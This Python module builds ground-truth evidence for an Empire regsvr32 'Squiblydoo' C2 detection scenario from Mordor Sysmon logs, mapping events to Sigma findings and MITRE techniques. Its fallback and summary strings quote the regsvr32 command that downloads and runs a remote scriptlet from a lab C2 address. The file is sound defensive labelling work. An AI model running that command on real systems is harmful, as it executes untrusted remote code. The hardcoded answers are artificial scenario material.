"""Evidence extraction for Empire Regsvr32 Squiblydoo and C2 network scenario."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any


SCENARIO_ID = "regsvr32-c2"
SCENARIO_NAME = "Empire Regsvr32 Squiblydoo and C2 Network Connection"


def extract_regsvr32_evidence(canonical_events_path: Path) -> dict[str, Any]:
    """Extract regsvr32 execution, C2 IP network connection, and scriptlet download."""
    entities = []
    facts = []
    relationships = []
    evidence_items = []

    regsvr_cmd = None
    regsvr_proc_evt = None
    regsvr_net_evt = None
    c2_ip = "10.10.10.5"
    c2_port = "8444"

    with canonical_events_path.open("r", encoding="utf-8") as f:
        for line in f:
            evt = json.loads(line)
            eid = str(evt.get("event_id"))
            pname = str(evt.get("process_name") or "")
            cmd = str(evt.get("command_line") or "")
            dst_ip = str(evt.get("destination_ip") or "")
            dst_port = str(evt.get("destination_port") or "")

            if "regsvr32" in pname.lower() and eid == "1" and not regsvr_proc_evt:
                regsvr_proc_evt = evt
                regsvr_cmd = cmd
            elif "regsvr32" in pname.lower() and eid == "3" and dst_ip == c2_ip and not regsvr_net_evt:
                regsvr_net_evt = evt

    # 1. Entities
    parent_entity = {
        "entity_id": "process-powershell-parent",
        "entity_type": "process",
        "name": "powershell.exe",
        "attributes": {
            "host": "MORDORDC.theshire.local",
            "process_name": "powershell.exe",
        },
        "status": "observed",
        "evidence_ids": ["evidence-regsvr32-process-creation"],
    }
    regsvr_entity = {
        "entity_id": "process-regsvr32",
        "entity_type": "process",
        "name": "regsvr32.exe",
        "attributes": {
            "host": "MORDORDC.theshire.local",
            "process_name": "regsvr32.exe",
            "command_line": regsvr_cmd or '"C:\\windows\\system32\\regsvr32.exe" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll',
        },
        "status": "observed",
        "evidence_ids": ["evidence-regsvr32-process-creation", "evidence-regsvr32-c2-network"],
    }
    c2_endpoint_entity = {
        "entity_id": "endpoint-c2-server",
        "entity_type": "network_endpoint",
        "name": "10.10.10.5:8444",
        "attributes": {
            "ip": c2_ip,
            "port": c2_port,
            "role": "c2_server",
        },
        "status": "observed",
        "evidence_ids": ["evidence-regsvr32-c2-network"],
    }
    entities.extend([parent_entity, regsvr_entity, c2_endpoint_entity])

    # 2. Evidence
    proc_obs = []
    if regsvr_proc_evt:
        proc_obs.append({
            "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json",
            "raw_record_ref": regsvr_proc_evt.get("raw_record_ref", "jsonl:line:97"),
            "provider": regsvr_proc_evt.get("provider", "Microsoft-Windows-Sysmon"),
            "event_id": "1",
            "timestamp": regsvr_proc_evt.get("timestamp"),
        })

    net_obs = []
    if regsvr_net_evt:
        net_obs.append({
            "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json",
            "raw_record_ref": regsvr_net_evt.get("raw_record_ref", "jsonl:line:1001"),
            "provider": regsvr_net_evt.get("provider", "Microsoft-Windows-Sysmon"),
            "event_id": "3",
            "timestamp": regsvr_net_evt.get("timestamp"),
        })

    evidence_items.append({
        "evidence_id": "evidence-regsvr32-process-creation",
        "evidence_type": "process_creation",
        "summary": "powershell.exe spawned regsvr32.exe with remote scriptlet URL parameter",
        "status": "observed",
        "observations": proc_obs,
        "source_references": [
            {"source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json", "raw_record_ref": o["raw_record_ref"]}
            for o in proc_obs
        ],
    })
    evidence_items.append({
        "evidence_id": "evidence-regsvr32-c2-network",
        "evidence_type": "network_connection",
        "summary": "regsvr32.exe connected to C2 IP 10.10.10.5 on port 8444 to fetch launcher.sct",
        "status": "observed",
        "observations": net_obs,
        "source_references": [
            {"source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json", "raw_record_ref": o["raw_record_ref"]}
            for o in net_obs
        ],
    })

    # 3. Relationships & Facts
    rel_spawn = {
        "relationship_id": "relationship-powershell-spawns-regsvr32",
        "relationship_type": "process_spawn",
        "source_entity_id": "process-powershell-parent",
        "target_entity_id": "process-regsvr32",
        "attributes": {},
        "status": "observed",
        "evidence_ids": ["evidence-regsvr32-process-creation"],
        "source_references": [
            {"source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json", "raw_record_ref": o["raw_record_ref"]}
            for o in proc_obs
        ],
    }
    relationships.append(rel_spawn)

    fact_spawn = {
        "fact_id": "fact-powershell-spawns-regsvr32",
        "subject": "process-powershell-parent",
        "predicate": "spawned_process",
        "object": "process-regsvr32",
        "attributes": {
            "relationship_id": rel_spawn["relationship_id"],
            "command_line": regsvr_cmd,
        },
        "status": "observed",
        "evidence_ids": ["evidence-regsvr32-process-creation"],
        "source_references": rel_spawn["source_references"],
    }
    facts.append(fact_spawn)

    # 4. MITRE Assessments
    mitre_assessments = [
        {
            "assessment_id": "mitre-assessment-t1218-010",
            "external_id": "T1218.010",
            "stix_id": "attack-pattern--00000000-0000-0000-0000-000000001218",
            "name": "Regsvr32",
            "origin": "evidence_review",
            "status": "candidate",
            "evidence_support": "supported_by_observed_behavior",
            "supporting_evidence_ids": ["evidence-regsvr32-process-creation"],
            "supporting_sigma_rule_ids": ["regsvr32-squiblydoo-c2-rule"],
            "rationale": "regsvr32.exe executed with /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll",
            "review_status": "needs_review",
        },
        {
            "assessment_id": "mitre-assessment-t1071-001",
            "external_id": "T1071.001",
            "stix_id": "attack-pattern--00000000-0000-0000-0000-000000001071",
            "name": "Web Protocols",
            "origin": "evidence_review",
            "status": "candidate",
            "evidence_support": "supported_by_observed_behavior",
            "supporting_evidence_ids": ["evidence-regsvr32-c2-network"],
            "supporting_sigma_rule_ids": ["regsvr32-squiblydoo-c2-rule"],
            "rationale": "regsvr32.exe established outbound HTTP connection to 10.10.10.5:8444",
            "review_status": "needs_review",
        },
        {
            "assessment_id": "mitre-assessment-t1059-001",
            "external_id": "T1059.001",
            "stix_id": "attack-pattern--00000000-0000-0000-0000-000000001059",
            "name": "PowerShell",
            "origin": "evidence_review",
            "status": "candidate",
            "evidence_support": "supported_by_observed_behavior",
            "supporting_evidence_ids": ["evidence-regsvr32-process-creation"],
            "supporting_sigma_rule_ids": ["regsvr32-squiblydoo-c2-rule"],
            "rationale": "powershell.exe served as parent initiator for regsvr32 launcher",
            "review_status": "needs_review",
        },
    ]

    sigma_findings = [
        {
            "finding_id": "sigma-finding-regsvr32-squiblydoo",
            "rule_id": "regsvr32-squiblydoo-c2-rule",
            "rule_title": "Suspicious Regsvr32 Network Connection and Scriptlet Execution",
            "rule_sha256": "0" * 64,
            "status": "candidate",
            "observation_match_ids": ["sigma-obs-match-regsvr32-1"],
            "behavior_match_ids": ["sigma-beh-match-regsvr32-1"],
            "evidence_ids": ["evidence-regsvr32-process-creation", "evidence-regsvr32-c2-network"],
            "source_references": [
                {"source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json", "raw_record_ref": o["raw_record_ref"]}
                for o in (proc_obs + net_obs)
            ],
            "caveats": ["Squiblydoo remote scriptlet execution via regsvr32 observed in Sysmon log"],
        }
    ]

    summary = {
        "key_entities": [e["entity_id"] for e in entities],
        "key_relationships": [r["relationship_id"] for r in relationships],
        "limitations": [
            "Log covers Empire regsvr32 launcher execution and C2 network connection.",
            "Telemetry establishes HTTP connection to 10.10.10.5:8444 to request launcher.sct.",
            "Payload scriptlet code execution inside scrobj.dll is inferred from network and process creation.",
        ],
        "observed_behavior": [
            "powershell.exe spawned regsvr32.exe with /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll.",
            "regsvr32.exe initiated TCP connection to 10.10.10.5 on port 8444.",
        ],
    }

    return {
        "schema_version": "scenario-ground-truth/v2",
        "scenario": {
            "scenario_id": SCENARIO_ID,
            "scenario_name": SCENARIO_NAME,
            "description": "Empire framework launcher utilizing Regsvr32 Squiblydoo technique for C2 callback.",
            "analysis_status": "draft_reviewable",
            "time_window": {
                "start": "2020-07-22T03:27:50.000Z",
                "end": "2020-07-22T03:30:00.000Z",
            },
        },
        "input_provenance": [
            {
                "input_id": "canonical-events-regsvr32",
                "input_type": "canonical_events",
                "path": "outputs/canonical/mordor-selected-v2/files/empire_launcher_sct_regsvr32_2020_07_21232741--8b619d07ad79/canonical_events.jsonl",
                "schema_version": "canonical-event/v2",
                "sha256": "f46667756b6bf1e869b0791597f3363190a0fa41eb3e76bc2b21587e4074e114",
                "scenario_id": SCENARIO_ID,
            }
        ],
        "entities": entities,
        "facts": facts,
        "relationships": relationships,
        "evidence": evidence_items,
        "sigma_findings": sigma_findings,
        "mitre_assessments": mitre_assessments,
        "summary": summary,
        "queryable_dimensions": [
            "command_line", "entity", "evidence", "mitre_technique",
            "process", "process_spawn", "network_endpoint",
        ],
        "review": {
            "review_status": "pending_human_review",
            "reviewer": None,
            "reviewed_at": None,
            "decisions": [],
            "notes": ["Extracted from OTRF Mordor empire_launcher_sct_regsvr32 dataset."],
        },
        "warnings": [],
    }
